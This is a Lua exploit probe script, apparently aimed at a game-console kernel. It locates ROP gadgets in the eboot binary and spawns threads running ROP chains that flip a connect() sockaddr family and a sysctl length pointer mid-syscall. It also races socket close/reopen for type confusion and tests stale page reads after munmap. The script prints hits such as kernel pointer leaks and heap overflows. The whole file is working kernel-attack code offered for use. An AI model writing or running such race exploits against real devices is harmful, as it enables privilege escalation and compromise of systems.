-- CRASH_CLASS: HIGH
-- PROBE 80o: Socket close-vs-use fd race
--
-- Two infinite-loop threads race a shared fd:
--   Thread 1: writes to shared memory location A (toggles between two values)
--   Thread 2: writes to shared memory location B (toggles between two values)
-- Main thread: creates socket, starts threads toggling fd-close/reopen,
--   then races read/getsockopt on the fd looking for type confusion.
--
-- Simpler approach: main thread does the syscalls (since threads can't syscall),
-- threads do memory writes that signal state, and we look for kernel anomalies.
--
-- Actually: threads CAN'T do syscalls (no syscall;ret gadget in eboot).
-- So the race must be: main thread rapidly close(fd)+socket()+read(fd)
-- while threads corrupt shared state the kernel reads.
--
-- Better approach for fd race WITHOUT thread syscalls:
--   1. Create socketpair → fd_a, fd_b
--   2. Thread 1: infinite loop writing marker1 (signals "alive")
--   3. Main thread: rapid close(fd_a) + socket() cycles, checking if
--      the new socket reuses fd_a's number, then read from fd_b
--   4. If close races with kernel's internal socket buffer operations,
--      we get cross-talk or UAF
--
-- Even better: since threads can only do memory writes, use threads to
-- corrupt sysctl/connect arguments WHILE main thread is in the syscall.
-- The kernel copies arguments from userland (copyin) — if the thread
-- modifies the data between the kernel's validation check and its use,
-- we get a TOCTOU.
--
-- Key insight: the REAL race is on POINTER arguments, not MIB values.
-- If we pass a sockaddr struct to connect(), and a thread swaps the
-- sockaddr.sa_family between AF_INET and AF_INET6 mid-copyin, the
-- kernel may validate for one family but parse for another → buffer
-- overread from undersized AF_INET struct interpreted as AF_INET6.

print("=== PROBE 80o: SOCKET FD RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. syscall.sc_getpid():tonumber())

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local pop_rdi_ret   = eboot + 0xC9DFE
local pop_rax_ret   = eboot + 0x992
local mov_rdi_eax   = eboot + 0x92C68
local ret_gadget    = eboot + 0x42
local push_rax_ret  = eboot + 0x962

-- =================================================================
-- SECTION A: CONNECT SOCKADDR TOCTOU
-- Thread toggles sockaddr.sa_family between AF_INET(2) and AF_INET6(28)
-- Main thread calls connect() on a socket. If copyin reads sa_family
-- as AF_INET6 but the struct is only 16 bytes (AF_INET sized), the
-- kernel reads 28 bytes → buffer overread from adjacent heap data.
-- =================================================================
print("")
print("=== [A] CONNECT SOCKADDR sa_family RACE ===")

-- Create a UDP socket (non-blocking connect is faster)
local sc_socket = make_syscall(97)
local ok_s, sock_fd = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(17))  -- AF_INET, SOCK_DGRAM, UDP
end)
print("[*] socket fd=" .. tostring(to_num(sock_fd)))

-- Build sockaddr_in at a known address (16 bytes for AF_INET)
-- Place it in GPU mmap so the thread can write to it too
local sc_mmap = make_syscall(477)

-- Sockaddr page
local ok_sa, sa_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(sa_page, 128)

-- sockaddr_in: family=2(AF_INET), port=80, addr=127.0.0.1
wd(sa_page, 0x00500002)      -- sa_len=0, sa_family=2, port=80(BE)=0x0050
wd(sa_page + 4, 0x0100007F)  -- 127.0.0.1

-- Put "poison" data right after the 16-byte sockaddr_in
-- If kernel reads past 16 bytes (AF_INET6 expects 28), it hits this
wd(sa_page + 16, 0xDEADBEEF)
wd(sa_page + 20, 0xCAFEBABE)
wd(sa_page + 24, 0x12345678)
wd(sa_page + 28, 0xAAAAAAAA)

print("[*] sockaddr at " .. q(sa_page))

-- Thread stack: toggle sa_family between 2 (AF_INET) and 28 (AF_INET6)
-- N cycles, then infinite loop
local ok_st, stack1 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local idx = 0
local function push(val)
    wq(stack1 + (idx * 8), val)
    idx = idx + 1
end

-- Toggle cycles: write AF_INET6(28) then AF_INET(2) to sa_page byte 1
-- sa_family is at sa_page + 1 (second byte in FreeBSD sockaddr)
-- But we're using mov [rdi],eax which writes 4 bytes — we need to
-- preserve the other bytes. sa_len(byte0)=0, sa_family(byte1)=2/28,
-- port(byte2-3)=0x0050
-- For AF_INET: dword at sa_page = 0x00500002
-- For AF_INET6: dword at sa_page = 0x0050001C (family=28)

local TOGGLE_CYCLES = 500

-- First cycle: RIP is pop_rdi_ret, first entry is RDI argument
push(sa_page)               -- RDI = sockaddr
push(pop_rax_ret)
push(uint64(0x0050001C))    -- AF_INET6 + port
push(mov_rdi_eax)           -- write AF_INET6

push(pop_rdi_ret)
push(sa_page)
push(pop_rax_ret)
push(uint64(0x00500002))    -- AF_INET + port
push(mov_rdi_eax)           -- write AF_INET back

for cycle = 2, TOGGLE_CYCLES do
    push(pop_rdi_ret)
    push(sa_page)
    push(pop_rax_ret)
    push(uint64(0x0050001C))
    push(mov_rdi_eax)

    push(pop_rdi_ret)
    push(sa_page)
    push(pop_rax_ret)
    push(uint64(0x00500002))
    push(mov_rdi_eax)

    if cycle % 100 == 0 then
        print("[*] chain: " .. idx .. " slots...")
    end
end

-- Infinite loop at end
push(pop_rax_ret)
push(push_rax_ret)
push(push_rax_ret)

print("[*] thread chain: " .. idx .. " slots")

-- Build context
local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)
wq(ctx + 0xE0, pop_rdi_ret)
wq(ctx + 0xF8, stack1)

local tid1 = memory.alloc(8)
zero(tid1, 8)

print("[*] spawning toggler thread...")
local ok1, rv1 = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid1), uint64(0))
end)
print("T1=" .. tostring(rv1) .. " ok=" .. tostring(ok1))

-- Now race: main thread calls connect() rapidly with the toggling sockaddr
local sc_connect = make_syscall(98)
local anomalies = 0
local crashes = 0
local interesting = 0

print("[*] racing connect()...")
for i = 1, 200 do
    local ok_c, rv_c = pcall(function()
        -- Pass sockaddr with size 28 (AF_INET6 size) even though it might
        -- be AF_INET at the moment — kernel checks sa_family after copyin
        return sc_connect(uint64(to_num(sock_fd)), uint64(sa_page), uint64(28))
    end)

    local rv_n = 0
    if ok_c then rv_n = to_num(rv_c) end

    -- Check for anything other than the expected -1 (ECONNREFUSED etc)
    if not ok_c then
        crashes = crashes + 1
    elseif rv_n ~= 0 and rv_n ~= 0xFFFFFFFF then
        anomalies = anomalies + 1
        if anomalies <= 3 then
            print("[!] connect anomaly i=" .. i .. " rv=" .. tostring(rv_c))
        end
    end

    -- Re-create socket every 20 iterations (connect changes socket state)
    if i % 20 == 0 then
        pcall(function() make_syscall(6)(uint64(to_num(sock_fd))) end)
        ok_s, sock_fd = pcall(function()
            return sc_socket(uint64(2), uint64(2), uint64(17))
        end)
    end
end

print(string.format("[A] DONE: 200 connect, anom=%d crash=%d", anomalies, crashes))

-- =================================================================
-- SECTION B: RAPID FD CLOSE/REOPEN RACE
-- Main thread: close(fd) + socket() in tight loop
-- Check if fd numbers get reused and if getsockopt returns wrong data
-- =================================================================
print("")
print("=== [B] FD CLOSE/REOPEN RACE ===")

-- Create initial socket
local ok_b, fd_b = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(6))  -- AF_INET, SOCK_STREAM, TCP
end)
local fd_n = to_num(fd_b)
print("[*] initial fd=" .. fd_n)

local sc_close = make_syscall(6)
local reuse_count = 0
local type_confusion = 0
local sc_getsockopt = make_syscall(118)
local optbuf = memory.alloc(32)
local optlen = memory.alloc(8)

for i = 1, 300 do
    -- Close the fd
    pcall(function() sc_close(uint64(fd_n)) end)

    -- Immediately reopen with a DIFFERENT socket type (UDP vs TCP)
    local alt_type = 2  -- SOCK_DGRAM
    if i % 2 == 0 then alt_type = 1 end  -- SOCK_STREAM

    local ok_new, fd_new = pcall(function()
        return sc_socket(uint64(2), uint64(alt_type), uint64(alt_type == 1 and 6 or 17))
    end)

    if ok_new then
        local new_n = to_num(fd_new)
        if new_n == fd_n then
            reuse_count = reuse_count + 1
        end
        fd_n = new_n

        -- Check socket type via getsockopt(SO_TYPE)
        zero(optbuf, 32)
        wd(optlen, 4)
        local ok_g, rv_g = pcall(function()
            -- SOL_SOCKET=0xFFFF, SO_TYPE=0x1008
            return sc_getsockopt(uint64(fd_n), uint64(0xFFFF), uint64(0x1008),
                uint64(optbuf), uint64(optlen))
        end)

        if ok_g and to_num(rv_g) == 0 then
            local reported_type = rd(optbuf)
            if reported_type ~= alt_type then
                type_confusion = type_confusion + 1
                if type_confusion <= 3 then
                    print(string.format("[!!!] TYPE CONFUSION: created %d, got %d at i=%d",
                        alt_type, reported_type, i))
                end
            end
        end
    end
end

print(string.format("[B] DONE: 300 cycles, reuse=%d confusion=%d", reuse_count, type_confusion))
if type_confusion > 0 then
    print("[B] *** FD TYPE CONFUSION DETECTED — KERNEL RACE WON ***")
end

-- =================================================================
-- SECTION C: SYSCTL OLDLENP POINTER RACE
-- Thread toggles oldlenp value between normal (0x800) and huge (0xFFFFFFFF)
-- If kernel copies length before thread changes it but uses after,
-- it may copyout more data than the buffer can hold → heap overflow
-- =================================================================
print("")
print("=== [C] SYSCTL OLDLENP RACE ===")

-- Use a second thread for oldlenp toggling
local ok_st2, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- oldlenp is in GPU mmap so thread can write it
local oldlenp_shared = sa_page + 0x100  -- reuse sa_page, offset 256
wd(oldlenp_shared, 0x800)              -- normal size
wd(oldlenp_shared + 4, 0)

local outbuf = memory.alloc(0x800)

-- Thread 2: toggle oldlenp between 0x800 and 0x7FFFFFFF
local idx2 = 0
local function push2(val)
    wq(stack2 + (idx2 * 8), val)
    idx2 = idx2 + 1
end

local LEN_CYCLES = 500

push2(oldlenp_shared)         -- RDI
push2(pop_rax_ret)
push2(uint64(0x7FFFFFFF))    -- huge length
push2(mov_rdi_eax)

push2(pop_rdi_ret)
push2(oldlenp_shared)
push2(pop_rax_ret)
push2(uint64(0x800))         -- normal
push2(mov_rdi_eax)

for cycle = 2, LEN_CYCLES do
    push2(pop_rdi_ret)
    push2(oldlenp_shared)
    push2(pop_rax_ret)
    push2(uint64(0x7FFFFFFF))
    push2(mov_rdi_eax)

    push2(pop_rdi_ret)
    push2(oldlenp_shared)
    push2(pop_rax_ret)
    push2(uint64(0x800))
    push2(mov_rdi_eax)
end

push2(pop_rax_ret)
push2(push_rax_ret)
push2(push_rax_ret)

print("[*] thread2 chain: " .. idx2 .. " slots")

local ctx2 = memory.alloc(0x600)
zero(ctx2, 0x600)
pcall(function() make_syscall(421)(uint64(ctx2)) end)
wq(ctx2 + 0xE0, pop_rdi_ret)
wq(ctx2 + 0xF8, stack2)

local tid2 = memory.alloc(8)
zero(tid2, 8)

print("[*] spawning oldlenp toggler...")
local ok2, rv2 = pcall(function()
    return make_syscall(430)(uint64(ctx2), uint64(tid2), uint64(0))
end)
print("T2=" .. tostring(rv2) .. " ok=" .. tostring(ok2))

-- Race: sysctl with shared oldlenp
local sc_sysctl = make_syscall(202)
local mib = memory.alloc(16)
wd(mib, 1)       -- CTL_KERN
wd(mib + 4, 4)   -- KERN_HOSTNAME (returns short string, safe)

local sysctl_ok = 0
local sysctl_big = 0
local kptrs = 0

for i = 1, 200 do
    zero(outbuf, 0x100)
    -- Reset oldlenp to normal (thread may have set it huge)
    wd(oldlenp_shared, 0x800)

    local ok_sc, rv_sc = pcall(function()
        return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf),
            uint64(oldlenp_shared), uint64(0), uint64(0))
    end)

    if ok_sc and to_num(rv_sc) == 0 then
        sysctl_ok = sysctl_ok + 1
        -- Check how much was actually written
        local written = rd(oldlenp_shared) or 0
        if written > 0x100 then
            sysctl_big = sysctl_big + 1
            if sysctl_big <= 3 then
                print("[!] sysctl wrote " .. written .. " bytes at i=" .. i)
            end
        end
    end

    -- Kernel pointer scan on output
    for off = 0, 0xF8, 8 do
        local v = rq(outbuf + off)
        if v then
            local h = 0
            if type(v) == "table" and v.h then h = v.h end
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                if kptrs <= 3 then
                    print("[!!!] KPTR +0x" .. string.format("%X", off) .. ": " .. q(v))
                end
            end
        end
    end
end

print(string.format("[C] DONE: ok=%d big_write=%d kptrs=%d", sysctl_ok, sysctl_big, kptrs))
if kptrs > 0 then
    print("[C] *** KERNEL POINTER LEAK VIA OLDLENP RACE ***")
end
if sysctl_big > 0 then
    print("[C] *** OVERSIZED WRITE DETECTED — HEAP OVERFLOW ***")
end

-- =================================================================
-- SECTION D: mmap/munmap PAGE RACE (detection only)
-- Main thread: munmap a GPU region, immediately re-read it
-- If stale TLB lets us read recycled page → data mismatch
-- =================================================================
print("")
print("=== [D] MMAP/MUNMAP STALE TLB ===")

local sc_munmap = make_syscall(73)
local stale_hits = 0

for i = 1, 50 do
    -- Allocate a page
    local ok_m, page = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m then break end

    -- Write known pattern
    wd(page, 0xAAAAAAAA)
    wd(page + 4, 0xBBBBBBBB)

    -- Unmap
    pcall(function() sc_munmap(uint64(page), uint64(0x4000)) end)

    -- Immediately try to read (should fault, but stale TLB might succeed)
    local val = rd(page)
    if val ~= nil then
        -- We read something! Check if it's our data or recycled
        if val ~= 0xAAAAAAAA then
            stale_hits = stale_hits + 1
            if stale_hits <= 3 then
                print(string.format("[!!!] STALE READ: expected AAAAAAAA got %08X at i=%d", val, i))
            end
        end
    end
end

print(string.format("[D] DONE: 50 cycles, stale_hits=%d", stale_hits))
if stale_hits > 0 then
    print("[D] *** STALE TLB DETECTED — KERNEL PAGE ACCESS ***")
end

print("")
print("=== PROBE 80o COMPLETE ===")
